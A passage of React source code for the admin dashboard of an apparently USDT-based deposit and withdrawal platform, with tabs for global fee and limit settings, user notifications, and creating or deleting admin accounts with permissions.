                        onChange={e => updateGlobalSetting('withdrawalFee', parseFloat(e.target.value))}
                      />
                    </div>
                    
                    <div className="setting-item">
                      <label>Min Deposit (USDT)</label>
                      <input 
                        type="number"
                        value={globalSettings.minDeposit}
                        onChange={e => updateGlobalSetting('minDeposit', parseFloat(e.target.value))}
                      />
                    </div>
                    
                    <div className="setting-item">
                      <label>Min Withdrawal (USDT)</label>
                      <input 
                        type="number"
                        value={globalSettings.minWithdrawal}
                        onChange={e => updateGlobalSetting('minWithdrawal', parseFloat(e.target.value))}
                      />
                    </div>
                    
                    <div className="setting-item">
                      <label>Max Withdrawal (USDT)</label>
                      <input 
                        type="number"
                        value={globalSettings.maxWithdrawal}
                        onChange={e => updateGlobalSetting('maxWithdrawal', parseFloat(e.target.value))}
                      />
                    </div>
                    
                    <div className="setting-item toggle">
                      <label>KYC Required for Withdrawal</label>
                      <label className="switch">
                        <input 
                          type="checkbox"
                          checked={globalSettings.kycRequired}
                          onChange={e => updateGlobalSetting('kycRequired', e.target.checked)}
                        />
                        <span className="slider"></span>
                      </label>
                    </div>
                    
                    <div className="setting-item toggle">
                      <label>Maintenance Mode</label>
                      <label className="switch">
                        <input 
                          type="checkbox"
                          checked={globalSettings.maintenanceMode}
                          onChange={e => updateGlobalSetting('maintenanceMode', e.target.checked)}
                        />
                        <span className="slider"></span>
                      </label>
                    </div>
                  </div>
                  
                  <div className="setting-item full-width">
                    <label>Global Announcement</label>
                    <textarea 
                      value={globalSettings.announcement}
                      onChange={e => updateGlobalSetting('announcement', e.target.value)}
                      placeholder="Enter announcement message (leave empty to hide)"
                      rows="3"
                    />
                  </div>
                  
                  <button className="save-settings-btn" onClick={() => alert('Settings saved!')}>
                    💾 Save Settings
                  </button>
                </div>
              )}
              
              {/* Notifications Tab */}
              {activeTab === 'notifications' && (
                <div className="notifications-section">
                  <h3>Send Notification</h3>
                  <p className="section-desc">Send a notification to all users or specific user</p>
                  
                  <div className="notification-form">
                    <div className="form-group">
                      <label>Message</label>
                      <textarea 
                        id="notification-message"
                        placeholder="Enter notification message..."
                        rows="4"
                      />
                    </div>
                    
                    <button 
                      className="send-notification-btn"
                      onClick={() => {
                        const message = document.getElementById('notification-message').value
                        if (message) {
                          sendNotification(message)
                          document.getElementById('notification-message').value = ''
                        }
                      }}
                    >
                      📤 Send Notification
                    </button>
                  </div>
                  
                  <div className="notification-history">
                    <h4>Notification History</h4>
                    <div className="notification-list">
                      {(() => {
                        const notifications = JSON.parse(localStorage.getItem('userNotifications') || '[]')
                        return notifications.filter(n => n.fromAdmin).slice(0, 10).map((n, idx) => (
                          <div key={idx} className="notification-item">
                            <span className="notification-time">{new Date(n.timestamp).toLocaleString()}</span>
                            <span className="notification-message">{n.message}</span>
                          </div>
                        ))
                      })()}
                    </div>
                  </div>
                </div>
              )}
              
              {/* Admins Tab */}
              {activeTab === 'admins' && (currentAdmin.role === 'master' || currentAdmin.permissions?.createAdmins) && (
                <div className="admins-section">
                  <h3>Admin Management</h3>
                  
                  {/* Create New Admin */}
                  <div className="create-admin-form">
                    <h4>Create New Admin</h4>
                    
                    <div className="form-row">
                      <div className="form-group">
                        <label>Username</label>
                        <input 
                          type="text"
                          value={newAdminForm.username}
                          onChange={e => setNewAdminForm({...newAdminForm, username: e.target.value})}
                          placeholder="Admin username"
                        />
                      </div>
                      
                      <div className="form-group">
                        <label>Password</label>
                        <input 
                          type="password"
                          value={newAdminForm.password}
                          onChange={e => setNewAdminForm({...newAdminForm, password: e.target.value})}
                          placeholder="Admin password"
                        />
                      </div>
                    </div>
                    
                    <div className="permissions-grid">
                      <h5>Permissions</h5>
                      {Object.entries(newAdminForm.permissions).map(([key, value]) => (
                        <label key={key} className="permission-item">
                          <input 
                            type="checkbox"
                            checked={value}
                            onChange={e => setNewAdminForm({
                              ...newAdminForm,
                              permissions: {...newAdminForm.permissions, [key]: e.target.checked}
                            })}
                          />
                          <span>{key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}</span>
                        </label>
                      ))}
                    </div>
                    
                    <button className="create-admin-btn" onClick={createAdmin}>
                      ➕ Create Admin
                    </button>
                  </div>
                  
                  {/* Admin List */}
                  <div className="admin-list">
                    <h4>Existing Admins</h4>
                    
                    <div className="admin-item master">
                      <div className="admin-info">
                        <span className="admin-name">👑 master</span>
                        <span className="admin-role">Master Admin</span>
                      </div>
                      <span className="admin-status">Cannot be modified</span>
                    </div>
                    
                    {adminAccounts.map(admin => (
                      <div key={admin.id} className="admin-item">
                        <div className="admin-info">
                          <span className="admin-name">🛡️ {admin.username}</span>
                          <span className="admin-created">Created: {new Date(admin.createdAt).toLocaleDateString()}</span>
                        </div>
                        <div className="admin-permissions">
                          {Object.entries(admin.permissions).filter(([k, v]) => v).map(([key]) => (
                            <span key={key} className="permission-badge">{key}</span>
                          ))}
                        </div>
                        <button 
                          className="delete-admin-btn"
                          onClick={() => deleteAdmin(admin.id)}
                        >
                          🗑️ Delete
                        </button>
                      </div>
                    ))}
                    
                    {adminAccounts.length === 0 && (
                      <p className="no-admins">No additional admins created</p>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
